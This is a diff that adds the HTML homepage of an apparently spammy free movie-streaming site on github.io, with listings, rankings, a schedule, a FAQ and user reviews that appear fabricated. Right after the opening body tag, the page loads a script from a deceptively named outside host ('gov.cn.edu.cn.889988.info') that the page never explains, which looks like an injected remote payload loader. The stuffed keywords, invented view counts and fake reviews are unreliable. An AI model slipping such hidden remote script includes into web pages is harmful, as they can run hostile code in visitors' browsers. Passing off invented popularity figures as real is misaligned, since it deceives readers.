@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>一看电影网 - 高清电影电视剧免费在线观看，打开即看</title>
+<meta name="description" content="一看电影网（yikandianyingwang-wap）提供高清电影与电视剧免费在线观看，片源丰富、更新及时，覆盖院线大片、经典老片、美剧韩剧与综艺动漫，手机电脑打开即看。">
+<meta name="keywords" content="一看电影网, yikandianyingwang-wap, 高清电影在线观看, 电视剧免费观看, 打开即看, 院线大片, 经典老片, 美剧韩剧, 综艺动漫">
+<meta name="author" content="一看电影网">
+<meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">
+<meta name="bingbot" content="index, follow">
+<meta name="renderer" content="webkit">
+<meta name="format-detection" content="telephone=no">
+<link rel="canonical" href="https://yikandianyingwang-wap.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:title" content="一看电影网 - 高清电影电视剧免费在线观看，打开即看">
+<meta property="og:description" content="片源丰富、更新及时，覆盖院线大片、经典老片、美剧韩剧与综艺动漫，手机电脑打开即看。">
+<meta property="og:url" content="https://yikandianyingwang-wap.github.io/">
+<meta property="og:site_name" content="一看电影网">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="一看电影网 - 高清电影电视剧免费在线观看，打开即看">
+<meta name="twitter:description" content="片源丰富、更新及时，覆盖院线大片、经典老片、美剧韩剧与综艺动漫。">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='88'>▶</text></svg>">
+<style>
+/* ==================== 令牌：终端霓虹 ==================== */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#07090f;--bg2:#0c1018;--panel:#11151f;--line:#1d2636;--line2:#2a3548;
+  --txt:#e6ebf5;--dim:#9aa6bd;--mute:#5f6b80;
+  --neon:#39ff14;--neon2:#7dff5e;--cyan:#00e5ff;--amber:#ffb020;--pink:#ff3c83;--red:#ff4d4d;
+  --mono:"JetBrains Mono","SFMono-Regular",Consolas,monospace;
+  --sans:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  --ease:cubic-bezier(.22,.8,.3,1);
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:var(--sans);background:var(--bg);color:var(--txt);line-height:1.85;overflow-x:hidden;
+  background-image:linear-gradient(rgba(29,38,54,.35) 1px,transparent 1px),linear-gradient(90deg,rgba(29,38,54,.35) 1px,transparent 1px);
+  background-size:42px 42px}
+a{color:inherit;text-decoration:none;transition:color .3s var(--ease)}
+a:hover{color:var(--neon2)}
+img{max-width:100%;display:block}
+ul,ol,dl,dd,dt{list-style:none;margin:0}
+button{font:inherit;border:none;background:none;color:inherit;outline:none;cursor:pointer}
+h1,h2,h3,h4{line-height:1.2;font-weight:700}
+::selection{background:var(--neon);color:#000}
+::-webkit-scrollbar{width:9px;height:9px}
+::-webkit-scrollbar-thumb{background:var(--line2)}
+::-webkit-scrollbar-thumb:hover{background:var(--neon)}
+
+.wrap{width:100%;max-width:1240px;margin:0 auto;padding:0 28px}
+section{padding:104px 0;position:relative}
+@media(max-width:640px){section{padding:64px 0}.wrap{padding:0 18px}}
+
+/* ==================== 状态栏 ==================== */
+.bar{background:#03050a;border-bottom:1px solid var(--line);font-family:var(--mono);font-size:11.5px;color:var(--dim);padding:9px 0;letter-spacing:.04em}
+.bar .wrap{display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap}
+.bar .blink{display:inline-block;width:7px;height:7px;background:var(--neon);border-radius:50%;box-shadow:0 0 8px var(--neon);animation:b 1.4s steps(2) infinite;margin-right:8px}
+@keyframes b{to{opacity:.15}}
+
+/* ==================== 顶栏 ==================== */
+.top{position:sticky;top:0;z-index:200;background:rgba(7,9,15,.94);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.tp-in{display:flex;align-items:center;justify-content:space-between;gap:20px;padding:13px 0}
+.logo{display:flex;align-items:center;gap:11px;flex-shrink:0;font-family:var(--mono);font-size:18px;letter-spacing:.02em}
+.logo .mk{width:30px;height:30px;border:1.5px solid var(--neon);display:grid;place-items:center;color:var(--neon);font-size:13px;box-shadow:0 0 10px rgba(57,255,20,.25)}
+.logo b{font-weight:600}
+.logo b i{font-style:normal;color:var(--neon)}
+.logo em{font-style:normal;font-size:9.5px;color:var(--mute);font-family:var(--sans);letter-spacing:.16em;margin-left:6px;border-left:1px solid var(--line2);padding-left:10px}
+.menu{display:flex;gap:2px;font-family:var(--mono);font-size:13px}
+.menu a{padding:9px 15px;color:var(--dim);position:relative}
+.menu a::before{content:">";opacity:0;margin-right:5px;color:var(--neon);transition:all .25s}
+.menu a:hover,.menu a.on{color:var(--neon)}
+.menu a:hover::before,.menu a.on::before{opacity:1}
+.srch{display:flex;align-items:center;gap:8px;border:1px solid var(--line2);background:var(--bg2);height:38px;padding:0 12px;width:190px;font-family:var(--mono);font-size:12px}
+.srch span{color:var(--neon)}
+.srch input{border:none;background:transparent;width:100%;color:var(--txt);font-size:12px}
+.srch input::placeholder{color:var(--mute)}
+.tbtn{display:none;width:42px;height:42px;border:1px solid var(--line2);color:var(--neon);font-size:17px}
+@media(max-width:1000px){
+  .tbtn{display:grid;place-items:center}
+  .srch{display:none}
+  .logo em{display:none}
+  .menu{position:absolute;top:68px;left:18px;right:18px;flex-direction:column;background:var(--panel);border:1px solid var(--line2);padding:8px;
+    transform:translateY(-8px);opacity:0;pointer-events:none;transition:all .35s var(--ease)}
+  .menu.open{transform:translateY(0);opacity:1;pointer-events:auto}
+  .menu a{padding:13px 14px;border-bottom:1px solid var(--line)}
+  .menu a:last-child{border-bottom:none}
+}
+
+/* ==================== 首屏：命令提示 ==================== */
+.hero{padding-top:0;padding-bottom:0}
+.cmd{padding:56px 0 60px;border-bottom:1px solid var(--line)}
+.term{border:1px solid var(--line2);background:var(--panel);max-width:880px;margin:0 auto}
+.term-h{display:flex;align-items:center;gap:8px;padding:11px 16px;border-bottom:1px solid var(--line);background:var(--bg2)}
+.term-h i{width:11px;height:11px;border-radius:50%;display:block}
+.term-h i:nth-child(1){background:var(--red)}.term-h i:nth-child(2){background:var(--amber)}.term-h i:nth-child(3){background:var(--neon)}
+.term-h span{margin-left:12px;font-family:var(--mono);font-size:11px;color:var(--mute)}
+.term-b{padding:26px 26px 30px;font-family:var(--mono);font-size:14px;line-height:2.1}
+.term-b .ln{display:block;color:var(--dim)}
+.term-b .pr{color:var(--neon)}
+.term-b .pt{color:var(--cyan)}
+.term-b .out{color:var(--txt)}
+.term-b h1{display:block;font-family:var(--sans);font-size:clamp(32px,6.5vw,68px);font-weight:800;letter-spacing:-1px;line-height:1.12;margin:6px 0 8px}
+.term-b h1 em{font-style:normal;color:var(--neon);text-shadow:0 0 20px rgba(57,255,20,.45)}
+.term-b .blink2{display:inline-block;width:10px;height:1.1em;background:var(--neon);vertical-align:middle;animation:b 1s steps(2) infinite}
+.term-b p{font-family:var(--sans);font-size:15px;color:var(--dim);max-width:640px;line-height:1.95;margin:12px 0 22px}
+.acts{display:flex;gap:12px;flex-wrap:wrap;font-family:var(--sans)}
+.btn{font-size:14px;padding:14px 30px;border:1px solid var(--neon);transition:all .4s var(--ease);letter-spacing:.03em}
+.btn.p{background:var(--neon);color:#000;font-weight:600}
+.btn.p:hover{transform:translate(-3px,-3px);box-shadow:6px 6px 0 var(--cyan)}
+.btn.s{background:transparent;color:var(--neon)}
+.btn.s:hover{background:var(--neon);color:#000}
+.hint{margin-top:20px;font-family:var(--mono);font-size:11.5px;color:var(--mute)}
+.hint b{color:var(--amber);font-weight:400}
+
+/* ==================== 栏目标题 ==================== */
+.col{display:flex;align-items:flex-end;gap:20px;flex-wrap:wrap;border-bottom:1px dashed var(--line2);padding-bottom:16px;margin-bottom:46px}
+.col .pm{font-family:var(--mono);font-size:12px;color:var(--neon);border:1px solid var(--line2);padding:4px 10px;letter-spacing:.1em}
+.col h2{font-size:clamp(24px,4.4vw,40px);letter-spacing:-.4px;flex:1;min-width:200px}
+.col h2 em{font-style:normal;color:var(--neon)}
+.col .more{font-family:var(--mono);font-size:12.5px;color:var(--dim);border-bottom:1px solid var(--line2);padding-bottom:3px;white-space:nowrap}
+.col .more:hover{color:var(--neon);border-color:var(--neon)}
+
+/* ==================== 栏目一：热门片单（列表式卡片）=================== */
+.list{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+.film{border:1px solid var(--line);background:var(--panel);overflow:hidden;transition:all .45s var(--ease);position:relative}
+.film::before{content:"";position:absolute;inset:0;border:1px solid transparent;pointer-events:none;transition:all .45s}
+.film:hover{transform:translateY(-6px);border-color:var(--neon);box-shadow:0 14px 40px rgba(57,255,20,.12)}
+.film:hover::before{border-color:var(--neon);inset:8px}
+.film .th{position:relative;height:220px;overflow:hidden}
+.film .th img{width:100%;height:100%;object-fit:cover;transition:transform 1s var(--ease);filter:saturate(.9) brightness(.9)}
+.film:hover .th img{transform:scale(1.08);filter:saturate(1.1) brightness(1)}
+.film .fl{position:absolute;left:12px;top:12px;display:flex;gap:6px}
+.film .fl span{font-family:var(--mono);font-size:10px;letter-spacing:.06em;padding:3px 8px;background:rgba(7,9,15,.86);border:1px solid var(--line2)}
+.film .fl .hot{color:var(--pink);border-color:var(--pink)}
+.film .fl .new{color:var(--neon);border-color:var(--neon)}
+.film .fl .hd{color:var(--cyan);border-color:var(--cyan)}
+.film .info{padding:20px 20px 22px}
+.film .meta{display:flex;gap:12px;font-family:var(--mono);font-size:11px;color:var(--mute);margin-bottom:10px}
+.film .meta b{color:var(--neon);font-weight:400}
+.film h3{font-size:18.5px;line-height:1.45;margin-bottom:9px}
+.film p{font-size:13px;color:var(--dim);line-height:1.85}
+.film .go{display:flex;justify-content:space-between;align-items:center;margin-top:16px;padding-top:14px;border-top:1px solid var(--line);font-family:var(--mono);font-size:12px;color:var(--mute)}
+.film:hover .go{color:var(--neon)}
+@media(max-width:900px){.list{grid-template-columns:1fr 1fr}}
+@media(max-width:560px){.list{grid-template-columns:1fr}}
+
+/* ==================== 栏目二：频道分类（表格）=================== */
+.chans{display:grid;grid-template-columns:1fr 1fr;border:1px solid var(--line);background:var(--panel)}
+.ch{border-bottom:1px solid var(--line);padding:22px 26px;display:grid;grid-template-columns:60px 1fr auto;gap:18px;align-items:center;transition:background .35s;cursor:pointer}
+.ch:nth-child(odd){border-right:1px solid var(--line)}
+.ch:nth-last-child(-n+2){border-bottom:none}
+.ch:hover{background:var(--bg2)}
+.ch .no{font-family:var(--mono);font-size:24px;color:var(--neon);line-height:1}
+.ch h3{font-size:16px;margin-bottom:4px}
+.ch p{font-size:12px;color:var(--dim);line-height:1.7}
+.ch .ct{font-family:var(--mono);font-size:11px;color:var(--mute);white-space:nowrap}
+.ch:hover .ct{color:var(--neon)}
+@media(max-width:720px){.chans{grid-template-columns:1fr}.ch:nth-child(odd){border-right:none}}
+
+/* ==================== 栏目三：热播榜单（横向条形）=================== */
+.rank{display:grid;gap:12px}
+.rk{display:grid;grid-template-columns:56px 1.8fr 1fr 96px;gap:18px;align-items:center;padding:16px 20px;border:1px solid var(--line);background:var(--panel);transition:all .4s;position:relative;overflow:hidden}
+.rk .bar{position:absolute;left:0;top:0;bottom:0;background:linear-gradient(90deg,rgba(57,255,20,.12),transparent);width:0;transition:width 1s var(--ease)}
+.rk>*{position:relative;z-index:1}
+.rk:hover{border-color:var(--neon);transform:translateX(6px)}
+.rk .n{font-family:var(--mono);font-size:26px;color:var(--mute);line-height:1}
+.rk.top .n{color:var(--neon)}
+.rk.top .n::after{content:" ▸";font-size:13px;color:var(--amber)}
+.rk .ti b{display:block;font-size:16.5px;line-height:1.4}
+.rk .ti span{font-family:var(--mono);font-size:11px;color:var(--mute)}
+.rk .sc{font-family:var(--mono);font-size:13px;color:var(--dim);letter-spacing:.04em}
+.rk .sc b{color:var(--neon);font-weight:400}
+.rk .vw{font-family:var(--mono);font-size:11.5px;border:1px solid var(--line2);text-align:center;padding:6px 0;transition:all .3s;color:var(--dim)}
+.rk:hover .vw{background:var(--neon);border-color:var(--neon);color:#000;font-weight:600}
+@media(max-width:720px){.rk{grid-template-columns:44px 1fr 76px}.rk .sc{display:none}}
+
+/* ==================== 栏目四：放映日历（双栏）=================== */
+.cal{display:grid;grid-template-columns:1fr 1fr;gap:32px}
+.cal-b h3{font-family:var(--mono);font-size:13px;letter-spacing:.08em;color:var(--neon);border-left:3px solid var(--neon);padding-left:12px;margin-bottom:4px}
+.cal-b .sub{font-size:12px;color:var(--mute);padding-left:15px;margin-bottom:20px}
+.day{display:grid;grid-template-columns:74px 1fr auto;gap:16px;align-items:center;padding:14px 0;border-bottom:1px dashed var(--line2)}
+.day .tm{font-family:var(--mono);font-size:14px;color:var(--amber)}
+.day b{font-size:15px;line-height:1.4;display:block}
+.day span{font-size:11.5px;color:var(--mute);font-family:var(--mono)}
+.day em{font-style:normal;font-family:var(--mono);font-size:10.5px;color:var(--cyan);border:1px solid var(--line2);padding:3px 8px;white-space:nowrap}
+.day em.live{color:var(--pink);border-color:var(--pink)}
+@media(max-width:820px){.cal{grid-template-columns:1fr}}
+
+/* ==================== 栏目五：用户评价（聊天式）=================== */
+.rev{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.rv{border:1px solid var(--line);background:var(--panel);padding:22px;transition:all .4s}
+.rv:hover{border-color:var(--cyan);background:var(--bg2)}
+.rv .hd{display:flex;align-items:center;gap:12px;margin-bottom:14px}
+.rv .av{width:40px;height:40px;border:1px solid var(--cyan);display:grid;place-items:center;font-family:var(--mono);font-size:13px;color:var(--cyan);flex-shrink:0}
+.rv .nm{font-size:14px}
+.rv .nm span{display:block;font-family:var(--mono);font-size:10.5px;color:var(--mute)}
+.rv p{font-size:13px;color:var(--dim);line-height:1.9}
+.rv .stars{font-family:var(--mono);font-size:12px;color:var(--amber);margin-top:14px}
+@media(max-width:900px){.rev{grid-template-columns:1fr 1fr}}
+@media(max-width:560px){.rev{grid-template-columns:1fr}}
+
+/* ==================== 栏目六：FAQ（双栏）=================== */
+.faq{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.fq{border:1px solid var(--line);background:var(--panel);padding:20px 22px;transition:all .4s}
+.fq:hover{border-color:var(--amber);background:var(--bg2)}
+.fq .q{font-family:var(--mono);font-size:11px;color:var(--amber);margin-bottom:9px}
+.fq h4{font-size:15.5px;margin-bottom:9px;line-height:1.5}
+.fq p{font-size:13px;color:var(--dim);line-height:1.9}
+@media(max-width:640px){.faq{grid-template-columns:1fr}}
+
+/* ==================== CTA ==================== */
+.cta{margin:0 28px;border:1px solid var(--neon);background:var(--panel);padding:60px 40px;text-align:center;position:relative}
+.cta::before{content:"";position:absolute;inset:8px;border:1px dashed rgba(57,255,20,.35);pointer-events:none}
+.cta .pr{font-family:var(--mono);font-size:12px;color:var(--neon);margin-bottom:16px}
+.cta h2{font-family:var(--sans);font-size:clamp(30px,6.5vw,64px);font-weight:800;letter-spacing:-1px;line-height:1.15}
+.cta h2 em{font-style:normal;color:var(--neon)}
+.cta p{font-size:15px;color:var(--dim);max-width:560px;margin:18px auto 32px}
+.cta .btns{display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
+.cta a{font-size:14px;padding:14px 32px;border:1px solid var(--neon);transition:all .4s}
+.cta .c1{background:var(--neon);color:#000;font-weight:600}
+.cta .c1:hover{transform:translate(-3px,-3px);box-shadow:6px 6px 0 var(--cyan)}
+.cta .c2{background:transparent;color:var(--neon)}
+.cta .c2:hover{background:var(--neon);color:#000}
+@media(max-width:640px){.cta{margin:0 18px;padding:44px 20px}}
+
+/* ==================== 页脚 ==================== */
+.foot{border-top:1px solid var(--line);padding:56px 0 0;background:#03050a}
+.f-grid{display:grid;grid-template-columns:1.7fr 1fr 1fr 1fr;gap:44px;margin-bottom:40px}
+.foot .logo{margin-bottom:16px}
+.foot .logo em{border-color:var(--line2)}
+.f-desc{font-size:13.5px;color:var(--dim);max-width:380px;line-height:1.95}
+.f-col h4{font-family:var(--mono);font-size:11.5px;letter-spacing:.14em;color:var(--neon);margin-bottom:20px}
+.f-col ul{display:flex;flex-direction:column;gap:11px}
+.f-col ul a{font-size:13.5px;color:var(--dim)}
+.f-col ul a:hover{color:var(--neon)}
+.social{display:flex;gap:8px;margin-top:20px}
+.social a{width:38px;height:38px;border:1px solid var(--line2);display:grid;place-items:center;font-family:var(--mono);font-size:12px;color:var(--dim);transition:all .3s}
+.social a:hover{border-color:var(--neon);color:var(--neon)}
+.f-bot{border-top:1px dashed var(--line);padding:22px 0;display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap;font-family:var(--mono);font-size:11.5px;color:var(--mute)}
+@media(max-width:860px){.f-grid{grid-template-columns:1fr 1fr;gap:34px}}
+
+.up{position:fixed;right:20px;bottom:24px;width:46px;height:46px;z-index:150;border:1px solid var(--neon);background:var(--bg2);color:var(--neon);font-size:18px;
+  display:grid;place-items:center;opacity:0;transform:translateY(20px);pointer-events:none;transition:all .4s}
+.up.show{opacity:1;transform:translateY(0);pointer-events:auto}
+.up:hover{background:var(--neon);color:#000}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<!-- ============ 状态栏 ============ -->
+<div class="bar"><div class="wrap"><span><i class="blink"></i>SYSTEM ONLINE · 片库同步正常 · 延迟 28ms</span><span>https://yikandianyingwang-wap.github.io/</span></div></div>
+
+<!-- ============ 顶栏 ============ -->
+<header class="top">
+  <div class="wrap tp-in">
+    <a class="logo" href="https://yikandianyingwang-wap.github.io/" aria-label="一看电影网 首页">
+      <span class="mk">▶</span><b>一看电影网<i>_</i></b><em>YIKAN · WAP</em>
+    </a>
+    <nav class="menu" id="menu" aria-label="主导航">
+      <a href="#home" class="on">首页</a>
+      <a href="#hot">热门片单</a>
+      <a href="#ch">频道分类</a>
+      <a href="#rank">热播榜单</a>
+      <a href="#cal">放映日历</a>
+      <a href="#faq">常见问题</a>
+    </nav>
+    <div class="srch" role="search"><span>🔍</span><input type="search" placeholder="search film..." aria-label="搜索影视内容"></div>
+    <button class="tbtn" id="tbtn" aria-label="菜单" aria-expanded="false">☰</button>
+  </div>
+</header>
+
+<!-- ============ 首屏：命令提示 ============ -->
+<section class="hero" id="home">
+  <div class="wrap">
+    <div class="cmd">
+      <div class="term">
+        <div class="term-h"><i></i><i></i><i></i><span>~/yikan — zsh — 132×40</span></div>
+        <div class="term-b">
+          <span class="ln"><span class="pr">yikan@film</span>:<span class="pt">~</span>$ cat welcome.txt</span>
+          <span class="ln out">一看电影网 · 打开即看，一看就停不下来。</span>
+          <h1>一看<em>电影网</em><span class="blink2"></span></h1>
+          <span class="ln out">高清电影 · 电视剧 · 美剧韩剧 · 综艺动漫 · 每日更新 · 免注册</span>
+          <p>一看电影网（yikandianyingwang-wap）是一个把选片流程压到最短的在线观影平台。不用下载客户端、不用注册登录，打开页面就能看。片源覆盖院线大片、经典老片、美剧韩剧与综艺动漫，720P / 1080P / 4K 多档画质，手机与电脑自适应播放。</p>
+          <div class="acts">
+            <a class="btn p" href="#hot">立即观看 →</a>
+            <a class="btn s" href="#ch">浏览频道列表</a>
+          </div>
+          <div class="hint">// 提示：使用 <b>Tab</b> 键在各频道间快速跳转，<b>Enter</b> 确认选片。<span class="blink2"></span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 栏目一：热门片单（列表式卡片）============ -->
+<section id="hot">
+  <div class="wrap">
+    <div class="col"><span class="pm">SECTION_01</span><h2>热门<em>片单</em></h2><a class="more" href="#">view all →</a></div>
+    <div class="list">
+      <article class="film"><div class="th"><img src="https://images.unsplash.com/photo-1489599849927-2ee91cede3ba?w=600&q=70" alt="热门影片一"></div><div class="fl"><span class="hot">HOT</span><span class="hd">4K</span></div><div class="info"><div class="meta"><span>院线大片</span><span>·</span><span>128 min</span><span>·</span><b>9.2</b></div><h3>雨夜追凶</h3><p>紧凑节奏与反转不断的悬疑剧情，上映首周即登上热播榜首，中文字幕同步上线。</p><div class="go"><span>院线大片 · 悬疑</span><span>查看详情 →</span></div></div></article>
+      <article class="film"><div class="th"><img src="https://images.unsplash.com/photo-1542204637-e67bc7d41e48?w=600&q=70" alt="热门影片二"></div><div class="fl"><span class="new">NEW</span><span class="hd">1080P</span></div><div class="info"><div class="meta"><span>经典老片</span><span>·</span><span>112 min</span><span>·</span><b>9.0</b></div><h3>旧城往事</h3><p>4K 修复版重新上线，经典老片中的市井群像，修复后细节层次分明。</p><div class="go"><span>经典老片 · 修复</span><span>查看详情 →</span></div></div></article>
+      <article class="film"><div class="th"><img src="https://images.unsplash.com/photo-1485846234645-a62644f84728?w=600&q=70" alt="热门影片三"></div><div class="fl"><span class="hot">HOT</span></div><div class="info"><div class="meta"><span>美剧韩剧</span><span>·</span><span>EP.12</span><span>·</span><b>8.9</b></div><h3>无声的证言</h3><p>限定剧完结，六集讲述一桩沉寂多年的旧案，中英双语字幕可选。</p><div class="go"><span>美剧韩剧 · 限定</span><span>查看详情 →</span></div></div></article>
+      <article class="film"><div class="th"><img src="https://images.unsplash.com/photo-1503095396549-807759245b35?w=600&q=70" alt="热门影片四"></div><div class="fl"><span class="hd">4K</span></div><div class="info"><div class="meta"><span>怀旧港片</span><span>·</span><span>104 min</span><span>·</span><b>8.8</b></div><h3>长街灯火</h3><p>港片黄金时代的代表作之一，夜景霓虹与江湖情义，修复后重映质感十足。</p><div class="go"><span>怀旧港片 · 江湖</span><span>查看详情 →</span></div></div></article>
+      <article class="film"><div class="th"><img src="https://images.unsplash.com/photo-1517604931442-7e0c8ed2963c?w=600&q=70" alt="热门影片五"></div><div class="fl"><span class="new">NEW</span></div><div class="info"><div class="meta"><span>综艺动漫</span><span>·</span><span>45 min</span><span>·</span><b>8.7</b></div><h3>周末放映室</h3><p>真人秀与热门番剧每日同步更新，周末轻松档的首选。</p><div class="go"><span>综艺动漫 · 更新</span><span>查看详情 →</span></div></div></article>
+      <article class="film"><div class="th"><img src="https://images.unsplash.com/photo-1440404653325-ab127d49abc1?w=600&q=70" alt="热门影片六"></div><div class="fl"><span class="hot">HOT</span><span class="hd">1080P</span></div><div class="info"><div class="meta"><span>电视剧集</span><span>·</span><span>EP.36</span><span>·</span><b>8.6</b></div><h3>弄堂岁月</h3><p>年代剧全集上线，市井群像与时代变迁，适合一口气刷完的剧集。</p><div class="go"><span>电视剧集 · 年代</span><span>查看详情 →</span></div></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 栏目二：频道分类（表格）============ -->
+<section id="ch" style="background:#03050a">
+  <div class="wrap">
+    <div class="col"><span class="pm">SECTION_02</span><h2>频道<em>分类</em></h2><a class="more" href="#">view all →</a></div>
+    <div class="chans">
+      <a class="ch" href="#"><span class="no">01</span><div><h3>院线大片</h3><p>同步院线最新上映，中文字幕在线观看</p></div><span class="ct">128 部</span></a>
+      <a class="ch" href="#"><span class="no">02</span><div><h3>经典老片</h3><p>黑白电影与怀旧影片，修复版专区</p></div><span class="ct">312 部</span></a>
+      <a class="ch" href="#"><span class="no">03</span><div><h3>电视剧集</h3><p>国产剧、港台剧与年代剧全集</p></div><span class="ct">96 部</span></a>
+      <a class="ch" href="#"><span class="no">04</span><div><h3>美剧韩剧</h3><p>同步更新，中英双语字幕可选</p></div><span class="ct">74 部</span></a>
+      <a class="ch" href="#"><span class="no">05</span><div><h3>综艺动漫</h3><p>真人秀、脱口秀与热门番剧每日更新</p></div><span class="ct">53 部</span></a>
+      <a class="ch" href="#"><span class="no">06</span><div><h3>更多题材</h3><p>喜剧、悬疑、战争、文艺与纪录片</p></div><span class="ct">168 部</span></a>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 栏目三：热播榜单（横向条形）============ -->
+<section id="rank">
+  <div class="wrap">
+    <div class="col"><span class="pm">SECTION_03</span><h2>热播<em>榜单</em></h2><a class="more" href="#">full list →</a></div>
+    <div class="rank">
+      <div class="rk top"><span class="n">01</span><div class="ti"><b>雨夜追凶</b><span>院线大片 · 悬疑</span></div><span class="sc">热度 <b>986,420</b></span><a class="vw" href="#">观看</a></div>
+      <div class="rk top"><span class="n">02</span><div class="ti"><b>无声的证言</b><span>美剧韩剧 · 限定</span></div><span class="sc">热度 <b>921,087</b></span><a class="vw" href="#">观看</a></div>
+      <div class="rk top"><span class="n">03</span><div class="ti"><b>旧城往事</b><span>经典老片 · 4K 修复</span></div><span class="sc">热度 <b>887,503</b></span><a class="vw" href="#">观看</a></div>
+      <div class="rk"><span class="n">04</span><div class="ti"><b>长街灯火</b><span>怀旧港片 · 江湖</span></div><span class="sc">热度 <b>814,266</b></span><a class="vw" href="#">观看</a></div>
+      <div class="rk"><span class="n">05</span><div class="ti"><b>弄堂岁月</b><span>电视剧集 · 年代</span></div><span class="sc">热度 <b>769,841</b></span><a class="vw" href="#">观看</a></div>
+      <div class="rk"><span class="n">06</span><div class="ti"><b>周末放映室</b><span>综艺动漫 · 更新</span></div><span class="sc">热度 <b>723,155</b></span><a class="vw" href="#">观看</a></div>
+      <div class="rk"><span class="n">07</span><div class="ti"><b>一封家书</b><span>经典老片 · 温情</span></div><span class="sc">热度 <b>685,902</b></span><a class="vw" href="#">观看</a></div>
+      <div class="rk"><span class="n">08</span><div class="ti"><b>城市边缘人</b><span>文艺经典 · 现实题材</span></div><span class="sc">热度 <b>638,477</b></span><a class="vw" href="#">观看</a></div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 栏目四：放映日历（双栏）============ -->
+<section id="cal" style="background:#03050a">
+  <div class="wrap">
+    <div class="col"><span class="pm">SECTION_04</span><h2>放映<em>日历</em></h2><a class="more" href="#">schedule →</a></div>
+    <div class="cal">
+      <div class="cal-b">
+        <h3>// DAY 1 — 今日首映</h3><div class="sub">今日新上线的片源</div>
+        <div class="day"><span class="tm">10:00</span><div><b>雨夜追凶</b><span>院线大片 · 128 min · 4K</span></div><em class="live">LIVE</em></div>
+        <div class="day"><span class="tm">12:30</span><div><b>无声的证言</b><span>美剧韩剧 · EP.12 完结</span></div><em class="live">LIVE</em></div>
+        <div class="day"><span class="tm">15:00</span><div><b>周末放映室</b><span>综艺动漫 · 45 min</span></div><em>更新</em></div>
+        <div class="day"><span class="tm">17:20</span><div><b>旧城往事</b><span>经典老片 · 112 min · 4K 修复</span></div><em>经典</em></div>
+      </div>
+      <div class="cal-b">
+        <h3>// DAY 2 — 明日预告</h3><div class="sub">即将上线的片源</div>
+        <div class="day"><span class="tm">09:00</span><div><b>弄堂岁月</b><span>电视剧集 · EP.37 新集</span></div><em>预告</em></div>
+        <div class="day"><span class="tm">11:30</span><div><b>长街灯火</b><span>怀旧港片 · 104 min</span></div><em>经典</em></div>
+        <div class="day"><span class="tm">14:00</span><div><b>一封家书</b><span>经典老片 · 126 min</span></div><em>经典</em></div>
+        <div class="day"><span class="tm">16:40</span><div><b>老片修复特辑</b><span>修复专区 · 月度精选</span></div><em>预告</em></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 栏目五：用户评价（聊天式）============ -->
+<section id="rev">
+  <div class="wrap">
+    <div class="col"><span class="pm">SECTION_05</span><h2>用户<em>评价</em></h2><a class="more" href="#">more →</a></div>
+    <div class="rev">
+      <div class="rv"><div class="hd"><div class="av">U1</div><div class="nm">观影的小张<span>2026-10-05</span></div></div><p>页面打开就能看，不用下载不用注册，找片也快。经典老片修复专区片量很足，画质比预期好。</p><div class="stars">★★★★★ 选片快 · 画质好</div></div>
+      <div class="rv"><div class="hd"><div class="av">U2</div><div class="nm">周末刷剧<span>2026-10-04</span></div></div><p>手机上追美剧很方便，中英双语字幕切换顺畅，更新也算及时，每天都有新内容。</p><div class="stars">★★★★☆ 追剧方便</div></div>
+      <div class="rv"><div class="hd"><div class="av">U3</div><div class="nm">老片爱好者<span>2026-10-03</span></div></div><p>冲着怀旧港片来的，没想到 4K 修复版的细节这么清楚，光影质感还在，值得反复看。</p><div class="stars">★★★★★ 修复质量高</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 栏目六：FAQ（双栏）============ -->
+<section id="faq" style="background:#03050a">
+  <div class="wrap">
+    <div class="col"><span class="pm">SECTION_06</span><h2>常见<em>问题</em></h2><a class="more" href="#">help →</a></div>
+    <div class="faq">
+      <div class="fq"><div class="q">Q.01 // 需要注册或付费吗？</div><h4>需要注册或付费吗？</h4><p>不需要。一看电影网（yikandianyingwang-wap）免注册、免下载客户端，免费即可观看，打开即看。</p></div>
+      <div class="fq"><div class="q">Q.02 // 支持哪些设备？</div><h4>支持哪些设备？</h4><p>手机、平板、电脑与智能电视均可播放，页面自适应屏幕尺寸，无需额外安装应用。</p></div>
+      <div class="fq"><div class="q">Q.03 // 片源多久更新？</div><h4>片源多久更新一次？</h4><p>每日 20:00 更新片单，院线大片与综艺动漫每日同步，美剧韩剧按集更新。</p></div>
+      <div class="fq"><div class="q">Q.04 // 画质和字幕如何？</div><h4>画质和字幕怎么样？</h4><p>提供 720P / 1080P / 4K 多档画质，多数影片配有中文字幕，部分支持中英双语切换。</p></div>
+      <div class="fq"><div class="q">Q.05 // 为什么叫「一看」？</div><h4>为什么叫「一看」？</h4><p>一看电影网把选片流程压到最短，一看就能找到想看的片子，一看就停不下来。</p></div>
+      <div class="fq"><div class="q">Q.06 // 播放卡顿怎么办？</div><h4>播放卡顿怎么办？</h4><p>可切换更低清晰度或刷新页面，建议检查网络连接；正常网络下起播迅速、拖动无延迟。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ CTA ============ -->
